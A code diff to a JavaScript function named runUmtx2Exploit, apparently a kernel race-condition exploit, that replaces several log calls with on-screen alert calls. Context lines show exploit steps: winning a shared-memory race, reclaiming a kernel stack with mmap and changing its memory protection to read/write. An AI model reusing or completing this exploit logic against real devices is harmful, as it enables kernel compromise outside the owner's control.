@@ -906,7 +906,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
             if (fd) {
                 winnerFd = fd;
                 winnerLookupFd = lookupFd;
-                await log(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
+                showTemporaryAlert(`overlapped shm regions! winner_fd = ${winnerFd}`, LogLevel.LOG);
             }
 
             // dont close lookup descriptor right away when it is possibly corrupted
@@ -957,7 +957,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         }
 
         if (count != config.max_race_attempts) {
-            await log(`Race won after ${count} attempts`, LogLevel.INFO);
+            showTemporaryAlert(`Race won after ${count} attempts`, LogLevel.INFO);
         } else {
             await log("Race max attempts reached, retrying...", LogLevel.INFO);
         }
@@ -1025,7 +1025,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
 
         kstacksToFix.push(kstack);
 
-        await log(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);
+        showTemporaryAlert(`Managed to reclaim kstack with mmap. kstack = ${kstack.toString(16)}`, LogLevel.INFO);
 
         // change memory protections to r/w
         const PROT_READ = 0x1;
@@ -1040,7 +1040,7 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
             continue;
         }
 
-        await log("Managed to modify kstack memory protection to r/w", LogLevel.INFO);
+        showTemporaryAlert("Managed to modify kstack memory protection to r/w", LogLevel.INFO);
 
         // check if we have access to the page
         const checkRes = await checkMemoryAccess(kstack);
